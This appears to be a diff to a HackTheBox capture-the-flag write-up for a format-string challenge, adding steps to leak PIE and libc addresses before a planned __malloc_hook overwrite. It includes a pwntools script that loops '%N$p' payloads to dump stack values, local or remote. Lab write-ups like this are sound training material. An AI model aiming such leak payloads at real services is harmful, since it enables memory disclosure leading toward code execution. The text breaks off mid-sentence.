@@ -42,8 +42,75 @@ format: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically lin
 
 5. Let's grab the piebase and potential libc.
 
+> Actually there is many potential libc address, but i grabbed the 1st one.
+
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd8097b8-44e8-4e63-8058-8765319f4a73)
 
 
+> Many potential pie we can use to calculate the base.
+
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f41313c3-13fb-4455-8ceb-aa392f095f1f)
 
+
+#### NOTES: In this writeup i won't explain again how to calculate the libc base and piebase again, i've explained many times be
+
+
+6. After calculating the piebase and libc base, before overwriting **__malloc_hook** with **one_gadgetA**, we need to identify the libc used at the remote server, so we won't work twice.
+7. Well what i did to identify the remote server is kinda lucky i guess, maybe there are many ways that are more straightforward.
+
+---
+
+### FLOW
+
+- Do breakrva at the printf() and run the script using GDB args.
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b52c71f9-3ab8-4bfc-95f4-5c5273816744)
+
+
+> SCRIPT Pt.1
+
+```py
+from pwn import *
+import os
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+## 0x11f1
+gdbscript = '''
+init-pwndbg
+breakrva 0x11f1
+continue
+'''.format(**locals())
+
+exe = './format'
+elf = context.binary = ELF(exe, checksec=True)
+# context.log_level = 'DEBUG'
+# context.log_level = 'ERROR'
+context.log_level = 'INFO'
+
+library = '/lib/x86_64-linux-gnu/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+# # LEAKING POTENTIAL LIBC BASE
+sh = start()
+for i in range(200):
+    sh.sendline('%{}$p'.format(i))
+    get = sh.recvline().strip()
+    print(str(i), ':', get)
+```
+
+> We got _IO_2_1_stdin_
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/23018b14-617e-4abf-aaf3-e6df41379ce2)
+
+
+- But when i used the leaked **_IO_2_1_stdin_** at the remote server and check it on blukat, it did not found any libc relevant to this.
+- Anyway, at the end i get the correct 
